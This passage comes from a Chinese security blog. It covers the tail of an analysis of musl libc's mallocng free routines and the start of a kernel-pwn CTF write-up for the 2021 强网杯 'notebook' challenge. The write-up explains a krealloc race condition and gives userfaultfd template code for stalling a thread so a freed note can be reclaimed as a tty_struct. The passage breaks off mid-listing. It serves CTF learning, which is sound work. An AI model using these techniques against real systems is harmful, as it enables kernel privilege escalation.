class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/meta.h, line 129</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>anyway，拿到了<code>meta</code>地址之后，通过<code>get_stride</code>函数获取到其中保存的chunk的大小。</p><p>后面定义了一系列的变量，看到第一个if语句：<code>if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx)</code>。前面一个判断条件是判断这个chunk的大小是否大于2页（<code>PGSZ</code>就是一页的大小），后面的则是判断这个chunk是否是由<code>malloc</code>通过<code>mmap</code>分配出来的。记得在分析<code>malloc</code>时提到当分配的chunk过大时会使用<code>mmap</code>直接分配且<code>last_idx</code>的值会被设置为0。这个if语句的主要目的是在释放一个较大的chunk时，将该chunk内含的一些页在内核层面上释放，这通过<code>madvice</code>系统调用来实现。</p><p>往后是一个循环。如果该chunk所在的<code>meta</code>的<code>free_mask</code>为0（表示当前的chunk是该<code>meta</code>中唯一一个释放的chunk）或该chunk释放后该<code>meta</code>中所有chunk都被释放，则跳出循环。否则修改<code>free_mask</code>位后返回。这里面的if-else语句不用管，因为涉及锁的问题，一般Linux系统都会加锁，因此else基本不会执行到。</p><p>如果释放的chunk既不是第一个，也不是最后一个，则会执行循环后面的代码。后面的调用<code>nontrivial_free</code>是关键操作，也是我们利用的突破点。</p><h2 id="nontrivial-free（-src-malloc-mallocng-free-c-line-72）"><a href="#nontrivial-free（-src-malloc-mallocng-free-c-line-72）" class="headerlink" title="nontrivial_free（/src/malloc/mallocng/free.c, line 72）"></a>nontrivial_free（<code>/src/malloc/mallocng/free.c, line 72</code>）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大多数的chunk释放请求都会执行到这个函数，第一个参数是<code>meta</code>，第二个是该<code>meta</code>内需要释放的chunk的索引。</p><p><code>mask</code>是<code>free_mask</code>和<code>avail_mask</code>相或的结果，二者都是比特位标识的控制位。第一个判断<code>if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))</code>中第一个条件指的是该<code>meta</code>中所有chunk是否都处于被使用或被释放的状态，第二个条件通过一个函数判断这个chunk是否可以释放，一般都为真。进入if语句体中判断该<code>meta</code>是否有下一个<code>meta</code>，如果有，将当前<code>meta</code>出链表，且如果该<code>meta</code>在出链表之前是链首且此时该链表中还有<code>meta</code>，则激活链首的<code>meta</code>。这里的激活（<code>activate_group</code>）是修改了<code>avail_mask</code>值，函数内强制要求该<code>meta</code>在修改前的<code>avail_mask</code>为0。然后调用<code>free_group</code>并返回。</p><p>如果进入了else语句体，说明<code>mask=0</code>，即<code>free_mask</code>和<code>avail_mask</code>均为0，该<code>meta</code>中所有chunk均正在被使用。如果该<code>meta</code>不是链首，则将该<code>meta</code>链入链表。最后更新<code>free_mask</code>并返回。</p><p>至此，有关于musl内存分配与释放的相关函数已经基本分析完毕，下一篇文章将重点介绍musl libc的利用方式。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel pwn 入门 (6)</title>
      <link href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/"/>
      <url>/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/</url>
      
        <content type="html"><![CDATA[<p>本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。</p><h1 id="强网杯2021-notebook"><a href="#强网杯2021-notebook" class="headerlink" title="强网杯2021-notebook"></a>强网杯2021-notebook</h1><p>这是一道kernel pwn题。我们首先打开ko文件看看。<br>本文主要参考资料：<a href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a></p><h1 id="Step-1-查看file-operations结构体"><a href="#Step-1-查看file-operations结构体" class="headerlink" title="Step 1: 查看file_operations结构体"></a>Step 1: 查看file_operations结构体</h1><p><img src="https://img-blog.csdnimg.cn/461bc74637f34598875234a7d39a5fe5.png"><br>找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了read函数。因为read函数在模块中的偏移为0，因此可以认为结构体中所有为0的字段都指向read函数。不过我们这里因为用不到其他函数，因此认为read函数也被定义了。</p><h1 id="Step-2-分析write函数"><a href="#Step-2-分析write函数" class="headerlink" title="Step 2: 分析write函数"></a>Step 2: 分析write函数</h1><p><img src="https://img-blog.csdnimg.cn/c444e30778b24578b00589c9b557145d.png"><br>write函数就是一个普通的写入，从用户内存读取，其中第三个参数index不能大于0x10，复制的size由notebook中的size决定。</p><h1 id="Step-3-分析ioctl函数"><a href="#Step-3-分析ioctl函数" class="headerlink" title="Step 3: 分析ioctl函数"></a>Step 3: 分析ioctl函数</h1><p><img src="https://img-blog.csdnimg.cn/7df089de93fc43b5a20e818f680c8311.png"><br>ioctl函数一共有4种有效指令码，分别对应add、gift、del、edit四个函数。接下来分别进行分析。</p><h1 id="Step-4-分析noteadd函数"><a href="#Step-4-分析noteadd函数" class="headerlink" title="Step 4: 分析noteadd函数"></a>Step 4: 分析noteadd函数</h1><p><img src="https://img-blog.csdnimg.cn/16565227723949e59e47793e9bdfb3bb.png"><br>添加函数中每一个note的大小不能超过0x60，传入的第三个参数将被拷贝到name中。</p><h1 id="Step-5-分析notegift函数"><a href="#Step-5-分析notegift函数" class="headerlink" title="Step 5: 分析notegift函数"></a>Step 5: 分析notegift函数</h1><p><img src="https://img-blog.csdnimg.cn/11527032b8af4f7f89067271e86eba19.png"><br>这个函数是直接将notebook这个数组输出出来了，我们能够实时获取到notebook中所有指针和size的信息。看上去是一个比较有用的函数。</p><h1 id="Step-6-分析notedel函数"><a href="#Step-6-分析notedel函数" class="headerlink" title="Step 6: 分析notedel函数"></a>Step 6: 分析notedel函数</h1><p><img src="https://img-blog.csdnimg.cn/d17320ba37cd4a83a451bee8cfbccd74.png"><br>删除函数中规中矩，就是一个删除功能，不留悬挂指针。</p><h1 id="Step-7-分析noteedit函数"><a href="#Step-7-分析noteedit函数" class="headerlink" title="Step 7: 分析noteedit函数"></a>Step 7: 分析noteedit函数</h1><p><img src="https://img-blog.csdnimg.cn/c1e9999836914b6b9f01a104e66d8f5e.png"><br>这个函数会修改内存块的大小，使用krealloc函数对齐重新分配空间，而且只有在确认重新分配的空间有效的情况下才会修改notebook数组中的元素。当传入的newsize为0时，会被当做free处理释放空间，同时移出指针和size。</p><h1 id="Step-8-分析read函数"><a href="#Step-8-分析read函数" class="headerlink" title="Step 8: 分析read函数"></a>Step 8: 分析read函数</h1><p><img src="https://img-blog.csdnimg.cn/2df71c3bf61c4c6784828e11a61295c7.png"><br>read函数也很普通，就是一个将notebook内存块中的内容读出的函数。</p><h1 id="Step-9-查看run-sh和init脚本"><a href="#Step-9-查看run-sh和init脚本" class="headerlink" title="Step 9: 查看run.sh和init脚本"></a>Step 9: 查看run.sh和init脚本</h1><p>本题的run.sh中，我们发现打开了kaslr、SMP保护。<br>本题的init文件中，有一些值得关注的地方：<br><img src="https://img-blog.csdnimg.cn/45014979827b419398f008b02368f6c3.png"><br>脚本中将&#x2F;proc&#x2F;modules中的notebook文件移动到了&#x2F;tmp中，我们能够通过&#x2F;tmp&#x2F;moduleaddr这个文件获取到notebook这个模块在内核中的加载地址。这便于我们调试，同时也可能为后面的漏洞利用提供条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /tmp/moduleaddr </span><br><span class="line">notebook 16384 0 - Live 0xffffffffc03ae000 (O)</span><br></pre></td></tr></table></figure><h1 id="Step-10-漏洞分析"><a href="#Step-10-漏洞分析" class="headerlink" title="Step 10: 漏洞分析"></a>Step 10: 漏洞分析</h1><p>注意noteedit函数，其中并没有对新分配的内存大小进行限制，也就是说我们可以绕过noteadd中申请大小最大只能为0x60的限制。</p><p>然后再看一下各个函数的加锁情况。noteadd、noteedit函数加了读锁，notedel函数加了写锁。这里存在条件竞争漏洞：noteedit使用的是krealloc函数重新分配内存。当重新分配的大小大于原来的大小时会将原来的内存空间释放，并且noteedit函数中<strong>notebook相应指针的修改发生在krealloc之后</strong>。如果在当前线程的noteedit还没有修改notebook时将这块内存重新分配，并在另一个线程中写入，就会造成条件竞争漏洞。但在当前线程一直在执行的情况下，krealloc和修改指针的操作相隔时间极短，在这段时间内重新分配到这块空间并修改难度极大。因此<strong>本题使用一种称为userfaultfd</strong>的利用方式来解决这个问题。</p><blockquote><p>（摘自<a href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）userfaultfd 本身只是一个常规的与处理缺页异常相关的系统调用，但是通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高。</p></blockquote><p>在Linux 5.4版本及以下内核中，这种利用方式都是可行的，往上的版本中内核规定只有root才有权限执行此类操作。不过我们通过uname -a命令查看到本题的linux版本是4.15.8，可以使用这种方式进行利用。</p><p>这种利用方式在原理上较为复杂，但是有现成的调用函数可用，只要传入适当的参数就能够设定在缺页异常时执行某个函数。具体的原理在<a href="https://blog.csdn.net/maybeYoc/article/details/123456398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165899942316782184627366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165899942316782184627366&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123456398-null-null.142%5Ev35%5Econtrol&utm_term=userfaultfd&spm=1018.2226.3001.4187">这篇文章</a>中有详细的解释，感兴趣的读者可以了解一下，不过不看也没关系，我们使用固定的函数模板即可。（以下代码摘自<a href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span> (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span><span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * [在这停顿.jpg]</span></span><br><span class="line"><span class="comment">         * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们应该如何触发缺页异常呢？很简单，我们只需要在noteedit函数中传入mmap出来空间的地址即可。那么有的读者就要问了，mmap出来的空间不是已经被映射了吗，krealloc之后的copy_from_user函数拷贝的大小是0x100远小于0x1000，为什么还会缺页呢？我们直接访问试试。写一条语句直接向这块空间写入一个字节，最后居然是segmentation fault，段错误。这是怎么回事？我们不是通过mmap已经分配了这个空间了吗？<br><img src="https://img-blog.csdnimg.cn/6dd9dfec98884eb9a2508bf20078498d.png"><br><img src="https://img-blog.csdnimg.cn/fb080b64bbfc4788a273730832920669.png"><br>通过内核调试，我们发现，内核确实无法访问这块mmap出来的空间，即使是vmmap也没有显示这块空间。</p><p>找了很长时间的资料，最终在<a href="https://blog.csdn.net/21cnbao/article/details/108480659?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165908725716782388037719%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165908725716782388037719&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108480659-null-null.142%5Ev35%5Econtrol&utm_term=%E4%BD%BF%E7%94%A8mmap%E5%8F%91%E7%94%9F%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8&spm=1018.2226.3001.4187">这篇文章</a>中发现了一丝端倪：</p><blockquote><p>当我们应用程序使用ｍｍap来创建匿名的内存映射的时候，页同样只是分配了虚拟内存，并没有分配物理内存，第一次去访问的时候才会通过触发缺页异常来分配物理页建立和虚拟页的映射关系。</p></blockquote><p>即这块内存并没有物理内存与之对应，因此会触发缺页异常。</p><p>我们事先对这块mmap出来的空间注册userfaultfd函数，那么缺页异常发生时就会执行这个函数了，在函数中我们可以以各种方式阻塞该线程的执行，最为简单的就是调用sleep函数睡一段时间，然后另外一个线程趁此机会进行其他的恶意操作（指重复打开&#x2F;dev&#x2F;ptmx文件使原note空间有可能被分配为tty_struct结构体，然后write函数调用进行修改）。</p><p>下面是打开&#x2F;dev&#x2F;ptmx时执行的一个关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init <span class="title function_">unix98_pty_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ptm_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">TTY_DRIVER_REAL_RAW |</span><br><span class="line">TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptm_driver))</span><br><span class="line">panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 ptm driver&quot;</span>);</span><br><span class="line">pts_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">TTY_DRIVER_REAL_RAW |</span><br><span class="line">TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(pts_driver))</span><br><span class="line">panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">ptm_driver-&gt;driver_name = <span class="string">&quot;pty_master&quot;</span>;</span><br><span class="line">ptm_driver-&gt;name = <span class="string">&quot;ptm&quot;</span>;</span><br><span class="line">ptm_driver-&gt;major = UNIX98_PTY_MASTER_MAJOR;</span><br><span class="line">ptm_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">ptm_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">ptm_driver-&gt;subtype = PTY_TYPE_MASTER;</span><br><span class="line">ptm_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">ptm_driver-&gt;init_termios.c_iflag = <span class="number">0</span>;</span><br><span class="line">ptm_driver-&gt;init_termios.c_oflag = <span class="number">0</span>;</span><br><span class="line">ptm_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">ptm_driver-&gt;init_termios.c_lflag = <span class="number">0</span>;</span><br><span class="line">ptm_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">ptm_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">ptm_driver-&gt;other = pts_driver;</span><br><span class="line">tty_set_operations(ptm_driver, 